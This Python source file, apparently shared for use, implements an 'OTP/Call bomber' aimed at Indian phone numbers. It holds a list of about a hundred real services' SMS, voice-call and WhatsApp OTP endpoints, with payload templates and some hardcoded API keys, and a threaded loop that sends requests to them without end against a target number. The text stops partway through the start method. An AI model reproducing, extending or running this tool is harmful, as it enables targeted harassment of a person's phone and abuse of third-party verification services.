"""
Bomber Module for AnujPy - Complete OTP/Call Bomber
Credit: @PyAnuj | Channel: @itz_4nuj1
Version: 2.0 - All 102 APIs Included
"""

import json
import urllib.parse
import time
import requests
import threading
import sys
from typing import Dict, Optional, Callable, List

# Optional imports for styling
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
    class Style: RESET_ALL = '\033[0m'

try:
    from cfonts import render
    CFONTS_AVAILABLE = True
except ImportError:
    CFONTS_AVAILABLE = False

# ============ COMPLETE API DATABASE (102 APIs) ============
APIS = [
    {
        "name": "Tata Capital Voice Call",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "isOtpViaCallAtLogin": "true"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "1MG Voice Call",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "payload": {"number": "{phone_number}", "otp_on_call": True},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Swiggy Call Verification",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Myntra Voice Call",
        "endpoint": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Flipkart Voice Call",
        "endpoint": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Amazon Voice Call",
        "endpoint": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "action": "voice_otp"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Paytm Voice Call",
        "endpoint": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Zomato Voice Call",
        "endpoint": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "type": "voice"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "MakeMyTrip Voice Call",
        "endpoint": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Goibibo Voice Call",
        "endpoint": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Ola Voice Call",
        "endpoint": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Uber Voice Call",
        "endpoint": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "KPN WhatsApp",
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "payload": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone_number}"}},
        "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json"},
        "params": "?channel=AND&version=3.2.6"
    },
    {
        "name": "Foxy WhatsApp",
        "endpoint": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "payload": {"user": {"phone_number": "+91{phone_number}"}, "via": "whatsapp"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Stratzy WhatsApp",
        "endpoint": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "payload": {"phoneNo": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Jockey WhatsApp",
        "endpoint": "https://www.jockey.in/apps/jotp/api/login/resend-otp",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "/+91{phone_number}?whatsapp=true"
    },
    {
        "name": "Rappi WhatsApp",
        "endpoint": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "payload": {"country_code": "+91", "phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Eka Care WhatsApp",
        "endpoint": "https://auth.eka.care/auth/init",
        "method": "POST",
        "payload": {"payload": {"allowWhatsapp": True, "mobile": "+91{phone_number}"}, "type": "mobile"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Lenskart SMS",
        "endpoint": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "payload": {"phoneCode": "+91", "telephone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "NoBroker SMS",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "countryCode": "IN"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "PharmEasy SMS",
        "endpoint": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Wakefit SMS",
        "endpoint": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Byju's SMS",
        "endpoint": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Hungama OTP",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "payload": {"mobileNo": "{phone_number}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "payload": {"mobile_number": "{phone_number}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "payload": {"phone_number": "{phone_number}", "language": "en"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PenPencil",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp",
        "method": "POST",
        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"},
        "params": "?smsType=1"
    },
    {
        "name": "PenPencil Get OTP",
        "endpoint": "https://api.penpencil.co/v1/users/get-otp",
        "method": "POST",
        "payload": {"username": "{phone_number}", "countryCode": "+91", "organizationId": "5eb393ee95fab7468a79d189"},
        "headers": {"client-id": "5eb393ee95fab7468a79d189", "Content-Type": "application/json"},
        "params": "?smsType=0&fallback=true"
    },
    {
        "name": "Zepto",
        "endpoint": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "payload": {"mobileNumber": "{phone_number}", "countryCode": "+91"},
        "headers": {"app_sub_platform": "WEB", "app_version": "15.11.1", "Content-Type": "application/json", "platform": "WEB", "tenant": "ZEPTO", "User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Snitch",
        "endpoint": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "payload": {"mobile_number": "+91{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone_number}", "resend_otp": "resend_otp"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "BeepKart",
        "endpoint": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "city": 362},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Lending Plate",
        "endpoint": "https://lendingplate.com/api.php",
        "method": "POST",
        "payload": {"mobiles": "{phone_number}", "resend": "Resend"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "ShipRocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "payload": {"mobileNumber": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "GoKwik",
        "endpoint": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "country": "in"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "NewMe",
        "endpoint": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "payload": {"mobile_number": "{phone_number}", "resend_otp_request": True},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Univest",
        "endpoint": "https://api.univest.in/api/auth/send-otp",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?type=web4&countryCode=91&contactNumber={phone_number}"
    },
    {
        "name": "Smytten",
        "endpoint": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "email": "test@example.com"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "CaratLane",
        "endpoint": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "payload": {"query": "mutation {SendOtp(input: {mobile: \"{phone_number}\", isdCode: \"91\", otpType: \"registerOtp\"}) {status {message code}}}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BikeFixup",
        "endpoint": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "app_signature": "4pFtQJwcz6y"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "WellAcademy",
        "endpoint": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "payload": {"contact_no": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "ServeTel",
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "payload": {"mobile_number": "{phone_number}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "GoPink Cabs",
        "endpoint": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "payload": {"check_mobile_number": "1", "contact": "{phone_number}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Shemaroome",
        "endpoint": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "payload": {"mobile_no": "+91{phone_number}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Cossouq",
        "endpoint": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "payload": {"mobilenumber": "{phone_number}", "otptype": "register"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "MyImagineStore",
        "endpoint": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Otpless",
        "endpoint": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "selectedCountryCode": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MyHubble Money",
        "endpoint": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "payload": {"phoneNumber": "{phone_number}", "channel": "SMS"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Tata Capital Business",
        "endpoint": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "payload": {"mobileNumber": "{phone_number}", "deviceOs": "Android", "sourceName": "MitayeFaasleWebsite"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "DealShare",
        "endpoint": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "hashCode": "k387IsBaTmn"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Snapmint",
        "endpoint": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Housing.com",
        "endpoint": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "country_url_name": "in"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "RentoMojo",
        "endpoint": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Khatabook",
        "endpoint": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "app_signature": "wk+avHrHZf2"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Netmeds",
        "endpoint": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Nykaa",
        "endpoint": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "payload": {"source": "sms", "app_version": "3.0.9", "mobile_number": "{phone_number}", "platform": "ANDROID", "domain": "nykaa"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "RummyCircle",
        "endpoint": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "isPlaycircle": False},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Animall",
        "endpoint": "https://animall.in/zap/auth/login",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "signupPlatform": "NATIVE_ANDROID"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PenPencil V3",
        "endpoint": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Entri",
        "endpoint": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "payload": {"phone": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Cosmofeed",
        "endpoint": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "version": "1.4.28"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Aakash",
        "endpoint": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "payload": {"mobile_number": "{phone_number}", "activity_type": "aakash-myadmission"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Revv",
        "endpoint": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "deviceType": "website"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "DeHaat",
        "endpoint": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "client_id": "kisan-app"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "A23 Games",
        "endpoint": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "device_id": "android123", "model": "Google,Android SDK built for x86,10"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Spencer's",
        "endpoint": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PayMe India",
        "endpoint": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "app_signature": "S10ePIIrbH3"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Shopper's Stop",
        "endpoint": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "type": "SIGNIN_WITH_MOBILE"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Hyuga Auth",
        "endpoint": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BigCash",
        "endpoint": "https://www.bigcash.live/sendsms.php",
        "method": "GET",
        "payload": {},
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "params": "?mobile={phone_number}&ip=192.168.1.1"
    },
    {
        "name": "Lifestyle Stores",
        "endpoint": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "payload": {"signInMobile": "{phone_number}", "channel": "sms"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "WorkIndia",
        "endpoint": "https://api.workindia.in/api/candidate/profile/login/verify-number/",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?mobile_no={phone_number}&version_number=623"
    },
    {
        "name": "PokerBaazi",
        "endpoint": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "mfa_channels": "phno"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "My11Circle",
        "endpoint": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MamaEarth",
        "endpoint": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "HomeTriangle",
        "endpoint": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Wellness Forever",
        "endpoint": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "payload": {"method": "firstRegisterApi", "data": "{\"customerMobile\":\"{phone_number}\",\"generateOtp\":\"true\"}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "HealthMug",
        "endpoint": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Vyapar",
        "endpoint": "https://vyaparapp.in/api/ftu/v3/send/otp",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?country_code=91&mobile={phone_number}"
    },
    {
        "name": "Kredily",
        "endpoint": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Tata Motors",
        "endpoint": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "sendOtp": "true"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Moglix",
        "endpoint": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "buildVersion": "24.0"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MyGov",
        "endpoint": "https://auth.mygov.in/regapi/register_api_ver1/",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone_number}&gender=male"
    },
    {
        "name": "TrulyMadly",
        "endpoint": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "locale": "IN"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Apna",
        "endpoint": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "hash_type": "play_store"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "CodFirm",
        "endpoint": "https://api.codfirm.in/api/customers/login/otp",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?medium=sms&phoneNumber=%2B91{phone_number}&email=&storeUrl=bellavita1.myshopify.com"
    },
    {
        "name": "Swipe",
        "endpoint": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "resend": True},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "More Retail",
        "endpoint": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "hash_key": "XfsoCeXADQA"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Country Delight",
        "endpoint": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "platform": "Android", "mode": "new_user"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "AstroSage",
        "endpoint": "https://vartaapi.astrosage.com/sdk/registerAS",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone_number}"
    },
    {
        "name": "Rapido",
        "endpoint": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "TooToo",
        "endpoint": "https://tootoo.in/graphql",
        "method": "POST",
        "payload": {"query": "query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }", "variables": {"mobile_no": "{phone_number}", "resend": 0}},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "ConfirmTkt",
        "endpoint": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?mobileNumber={phone_number}"
    },
    {
        "name": "BetterHalf",
        "endpoint": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "isd_code": "91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Charzer",
        "endpoint": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}", "appSource": "CHARZER_APP"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Nuvama Wealth",
        "endpoint": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "payload": {"mobileNo": "{phone_number}", "emailID": "test@example.com"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Mpokket",
        "endpoint": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "KFC SMS",
        "endpoint": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
        "method": "POST",
        "payload": {"phoneNumber": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Burger King",
        "endpoint": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        "method": "POST",
        "payload": {"phone_no": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Pizza Hut",
        "endpoint": "https://api.pizzahut.io/v1/otp/generate",
        "method": "POST",
        "payload": {"phone": "+91{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BookMyShow",
        "endpoint": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "method": "POST",
        "payload": {"channel": "phone", "details": {"phone": "{phone_number}"}},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BigBasket",
        "endpoint": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "method": "POST",
        "payload": {"identifier": "{phone_number}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Hotstar",
        "endpoint": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register",
        "method": "PUT",
        "payload": {"phone_number": "{phone_number}", "country_prefix": "91"},
        "headers": {"Content-Type": "application/json"},
        "params": "?register-by=phone_otp"
    },
    {
        "name": "Voot",
        "endpoint": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        "method": "POST",
        "payload": {"type": "mobile", "mobile": "{phone_number}", "countryCode": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "SonyLiv",
        "endpoint": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        "method": "POST",
        "payload": {"mobileNumber": "{phone_number}", "country": "IN", "channelPartnerID": "MSMIND"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Dream11",
        "endpoint": "https://www.dream11.com/graphql/mutation/pwa/register",
        "method": "POST",
        "payload": {"query": "mutation register($mobileNumber: String!) { registerSendOTPMutation(mobileNumber: $mobileNumber) { message }}", "variables": {"mobileNumber": "{phone_number}"}},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Vedantu",
        "endpoint": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "payload": {"phoneNumber": "{phone_number}", "phoneCode": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Unacademy",
        "endpoint": "https://unacademy.com/api/v3/user/user_check/",
        "method": "POST",
        "payload": {"phone": "{phone_number}", "country_code": "IN", "send_otp": True},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "RedBus",
        "endpoint": "https://m.redbus.in/api/getOtp",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?number={phone_number}&cc=91"
    },
    {
        "name": "Zee5",
        "endpoint": "https://b2bapi.zee5.com/device/sendotp_v1.php",
        "method": "GET",
        "payload": {},
        "headers": {},
        "params": "?phoneno={phone_number}"
    },
    {
        "name": "Domino's",
        "endpoint": "https://api.dominos.co.in/loginhandler/forgotpassword",
        "method": "POST",
        "payload": {"mobile": "{phone_number}"},
        "headers": {"Content-Type": "application/json", "api_key": "d2aeb489bb8df385"}
    }
]

# ============ BOMBING THREAD CLASS ============
class BombingThread(threading.Thread):
    def __init__(self, api, phone, stats, lock, delay=0.05):
        threading.Thread.__init__(self)
        self.api = api
        self.phone = phone
        self.stats = stats
        self.lock = lock
        self.delay = delay
        self.running = True
    
    def run(self):
        while self.running:
            try:
                url = self.api["endpoint"]
                if "params" in self.api:
                    url += self.api["params"].replace("{phone_number}", self.phone)
                
                payload = self.api.get("payload", {})
                if payload:
                    payload_str = json.dumps(payload).replace("{phone_number}", self.phone)
                    try:
                        payload = json.loads(payload_str)
                    except:
                        payload = payload_str
                
                headers = self.api["headers"].copy()
                headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                
                if self.api["method"] == "POST":
                    if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                        if isinstance(payload, dict):
                            data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
                        else:
                            data = payload
                        r = requests.post(url, data=data, headers=headers, timeout=3)
                    else:
                        r = requests.post(url, json=payload if isinstance(payload, dict) else None, 
                                        data=payload if not isinstance(payload, dict) else None, 
                                        headers=headers, timeout=3)
                else:
                    r = requests.get(url, headers=headers, timeout=3)
                
                with self.lock:
                    if r.status_code in [200, 201, 202, 204]:
                        self.stats["success"] += 1
                    self.stats["total"] += 1
                    self.stats["last_api"] = self.api["name"]
                    self.stats["last_status"] = r.status_code
            except:
                with self.lock:
                    self.stats["total"] += 1
                    self.stats["last_api"] = self.api["name"]
                    self.stats["last_status"] = "FAILED"
            time.sleep(self.delay)
    
    def stop(self):
        self.running = False

# ============ MAIN BOMBER CLASS ============
class Bomber:
    """Main Bomber Class for AnujPy - Complete OTP/Call Bomber"""
    
    def __init__(self):
        self.active_threads = []
        self.is_running = False
        self.stats = {"success": 0, "total": 0, "last_api": "", "last_status": ""}
        self.lock = threading.Lock()
    
    @staticmethod
    def validate_phone(phone: str) -> Optional[str]:
        """Validate and format Indian phone number"""
        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) == 10 and phone[0] in '6789':
            return phone
        elif len(phone) == 12 and phone.startswith('91'):
            return phone[2:]
        return None
    
    def start(self, phone_number: str, mode: str = "infinite", 
              duration: int = 60, callback: Optional[Callable] = None) -> Dict:
        """
        Start bombing target phone number
        
        Args:
            phone_number: Target mobile number (10 digits)
            mode: 'infinite' or 'timed'
            duration: Duration in seconds (for timed mode)
            callback: Optional callback function for stats updates
        
        Returns:
            Dict with statistics
        """
        phone = self.validate_phone(phone_number)
        if not phone:
            return {"error": "Invalid phone number! Use 10-digit Indian number starting with 6,7,8,9"}
        
        if self.is_running:
            return {"error": "Bomber already running! Stop it first."}
        
        self.is_running = True
